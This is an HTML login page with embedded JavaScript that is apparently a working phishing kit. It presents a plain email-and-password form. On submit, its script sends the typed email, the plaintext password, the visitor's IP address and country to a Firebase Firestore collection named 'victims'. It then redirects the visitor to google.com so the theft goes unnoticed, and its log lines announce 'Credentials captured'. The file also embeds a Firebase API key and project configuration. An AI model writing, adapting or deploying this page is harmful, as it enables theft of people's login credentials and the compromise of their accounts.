<!DOCTYPE html>
<html>
<head>
  <title>Login</title>
  <style>
    body{
      font-family:Arial;
      background:#111;
      color:white;
      display:flex;
      justify-content:center;
      align-items:center;
      height:100vh;
    }

    .box{
      background:#1b1b1b;
      padding:30px;
      border-radius:10px;
      width:300px;
    }

    input{
      width:100%;
      padding:10px;
      margin-top:10px;
      background:#222;
      border:1px solid #444;
      color:white;
    }

    button{
      width:100%;
      padding:10px;
      margin-top:15px;
      background:#00ff99;
      border:none;
      cursor:pointer;
      font-weight:bold;
    }
  </style>
</head>
<body>

<div class="box">
  <h2>Login</h2>

  <form id="loginForm">
    <input type="email" name="email" id="email" placeholder="Email" required>
    <input type="password" name="password" id="password" placeholder="Password" required>
    <button type="submit">LOGIN</button>
  </form>
</div>

<script type="module">
// ============================================================
// ⚙  FIREBASE CONFIG — Same config as dashboard.html
// ============================================================
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import {
  getFirestore, collection, addDoc, serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyAIaLegzw6zormEeShU-aJVHQJ9xst5mZo",
  authDomain: "relaychatbox.firebaseapp.com",
  projectId: "relaychatbox",
  storageBucket: "relaychatbox.firebasestorage.app",
  messagingSenderId: "467332024133",
  appId: "1:467332024133:web:6a70774f2d55ad95ba602c",
  measurementId: "G-5MDTQ0V1DK"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Redirect URL after successful login (change this to your desired destination)
const REDIRECT_URL = "https://www.google.com";

document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();
  
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  
  console.log('Form submitted with email:', email);
  
  // Get IP address - using ipapi.co which supports HTTPS
  let ipAddress = 'Unknown';
  let country = 'Unknown';
  
  try {
    // Try to get IP and location from ipapi.co (supports HTTPS)
    const ipResponse = await fetch('https://ipapi.co/json/');
    if (ipResponse.ok) {
      const ipData = await ipResponse.json();
      ipAddress = ipData.ip || 'Unknown';
      country = ipData.country_code || 'Unknown';
      console.log('IP Data:', ipAddress, country);
    }
  } catch (err) {
    console.warn('Could not fetch IP/location:', err.message);
    // Fallback: try ip-api.com without location
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      if (response.ok) {
        const data = await response.json();
        ipAddress = data.ip || 'Unknown';
      }
    } catch (err2) {
      console.warn('Fallback IP fetch also failed:', err2.message);
    }
  }
  
  // Get current date and time
  const now = new Date();
  const dateStr = now.toISOString().split('T')[0]; // YYYY-MM-DD
  const timeStr = now.toISOString().split('T')[1].slice(0, 8); // HH:MM:SS
  
  console.log('Date:', dateStr, 'Time:', timeStr);
  
  // Extract username from email (part before @) or use "user" if not available
  let username = "user";
  if (email && email.includes('@')) {
    username = email.split('@')[0];
  }
  
  console.log('Username:', username);
  
  // Store in Firebase
  try {
    console.log('Attempting to write to Firebase Firestore...');
    console.log('Project ID:', firebaseConfig.projectId);
    
    const docRef = await addDoc(collection(db, 'victims'), {
      email: email,
      username: username,
      password: password,
      ip: ipAddress,
      country: country,
      date: now.toISOString(),
      time: timeStr,
      createdAt: serverTimestamp()
    });
    
    console.log('✅ Document written with ID: ', docRef.id);
    console.log('✅ Credentials captured and sent to Firebase successfully!');
    
    // Small delay to ensure data is written before redirect
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 500);
  } catch (error) {
    console.error('❌ Error sending to Firebase:', error.code, error.message);
    console.error('Full error:', error);
    
    // Show alert to user about the error (for debugging)
    alert('Login processing... (Data capture: ' + error.code + ')');
    
    // Still redirect even if Firebase fails
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 300);
  }
});
</script>

</body>
</html>
